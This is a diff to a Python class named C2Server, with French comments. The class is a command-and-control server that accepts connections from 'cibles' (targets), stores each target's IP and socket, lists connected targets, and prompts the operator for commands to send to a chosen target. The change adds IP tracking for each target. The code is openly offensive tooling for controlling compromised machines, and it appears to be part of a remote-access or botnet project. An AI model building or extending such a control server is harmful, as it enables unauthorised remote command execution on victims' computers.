@@ -6,7 +6,7 @@ class C2Server:
         # Initialisation des paramètres du serveur
         self.host = host
         self.port = port
-        self.cibles = {}  # Dictionnaire pour stocker les cibles {cible_id: socket}
+        self.cibles = {}  # Dictionnaire pour stocker les cibles {cible_id: (ip, socket)}
         self.cible_count = 0  # Compteur pour générer des IDs uniques pour chaque cible
         self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Création d'un socket serveur
         self.server_socket.bind((self.host, self.port))  # Lier le socket à l'adresse et au port
@@ -18,13 +18,14 @@ class C2Server:
         while True:
             # Accepter une nouvelle connexion (blocage ici jusqu'à une connexion entrante)
             client_socket, client_address = self.server_socket.accept()
+            ip = client_address[0]  # Récupérer l'IP de la cible
             # Créer un ID unique pour chaque nouvelle cible
             cible_id = f"cible_{self.cible_count}"
-            # Stocker le socket de la cible dans le dictionnaire
-            self.cibles[cible_id] = client_socket
+            # Stocker l'IP et le socket de la cible dans le dictionnaire
+            self.cibles[cible_id] = (ip, client_socket)
             # Incrémenter le compteur de cibles
             self.cible_count += 1
-            print(f"[+] {cible_id} connecté depuis {client_address}")
+            print(f"[+] {cible_id} connecté depuis {ip}")
 
     def display_menu(self):
         # Afficher le menu des choix pour l'utilisateur
@@ -55,8 +56,8 @@ class C2Server:
             print("[!] Aucune cible connectée.")  # Si aucune cible n'est connectée
         else:
             print("\nCibles connectées:")
-            for cible_id in self.cibles:
-                print(f"- {cible_id}")  # Afficher chaque cible avec son ID
+            for cible_id, (ip, _) in self.cibles.items():  # Afficher chaque cible avec son IP
+                print(f"- {cible_id} (IP: {ip})")
 
     def select_cible(self):
         # Demander à l'utilisateur de saisir l'ID de la cible à sélectionner
@@ -68,7 +69,7 @@ class C2Server:
 
     def interact(self, cible_id):
         # Fonction pour interagir avec la cible sélectionnée
-        sock = self.cibles[cible_id]  # Récupérer le socket de la cible
+        ip, sock = self.cibles[cible_id]  # Récupérer l'IP et le socket de la cible
         while True:
             # Demander à l'utilisateur de saisir une commande pour la cible
             cmd = input(f"{cible_id} > ").strip()
